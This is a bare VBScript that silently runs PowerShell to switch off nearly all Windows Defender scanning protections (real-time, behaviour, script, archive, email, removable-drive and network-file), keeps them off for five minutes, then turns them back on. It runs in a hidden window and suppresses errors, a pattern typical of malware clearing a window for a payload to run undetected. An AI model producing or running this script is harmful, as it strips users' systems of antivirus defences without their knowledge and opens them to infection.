On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")

psCommand = "Set-MpPreference -DisableRealtimeMonitoring $true; " & _
            "Set-MpPreference -DisableBehaviorMonitoring $true; " & _
            "Set-MpPreference -DisableIOAVProtection $true; " & _
            "Set-MpPreference -DisableScriptScanning $true; " & _
            "Set-MpPreference -DisableArchiveScanning $true; " & _
            "Set-MpPreference -DisableEmailScanning $true; " & _
            "Set-MpPreference -DisableRemovableDriveScanning $true; " & _
            "Set-MpPreference -DisableScanningNetworkFiles $true"

WshShell.Run "powershell -Command """ & psCommand & """", 0, True

WScript.Sleep 300000

psCommand = "Set-MpPreference -DisableRealtimeMonitoring $false; " & _
            "Set-MpPreference -DisableBehaviorMonitoring $false; " & _
            "Set-MpPreference -DisableIOAVProtection $false; " & _
            "Set-MpPreference -DisableScriptScanning $false; " & _
            "Set-MpPreference -DisableArchiveScanning $false; " & _
            "Set-MpPreference -DisableEmailScanning $false; " & _
            "Set-MpPreference -DisableRemovableDriveScanning $false; " & _
            "Set-MpPreference -DisableScanningNetworkFiles $false"

WshShell.Run "powershell -Command """ & psCommand & """", 0, True

Set WshShell = Nothing